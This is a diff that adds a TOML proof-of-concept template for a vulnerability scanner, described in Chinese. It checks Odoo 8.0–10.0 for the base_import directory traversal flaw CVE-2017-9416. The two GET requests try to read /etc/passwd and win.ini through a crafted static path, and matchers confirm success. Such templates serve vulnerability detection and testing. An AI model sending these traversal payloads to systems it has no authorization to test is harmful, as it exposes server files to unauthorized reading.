@@ -1,0 +1,64 @@
+[info]
+author = "ave"
+description = "检测 Odoo base_import 模块中的目录遍历漏洞（CVE-2017-9416），攻击者可通过构造路径读取服务器任意文件"
+id = "POC-AVE-2017-0132"
+name = "Odoo 8.0/9.0/10.0 目录遍历漏洞 PoC"
+severity = "medium"
+tags = ["ave-2017-0132"]
+vuln_id = [
+    "CVE-2017-9416",
+    "AVE-2017-0132",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/base_import/static/etc/passwd"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/base_import/static/c:/windows/win.ini"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "bit app support",
+    "fonts",
+    "extensions",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
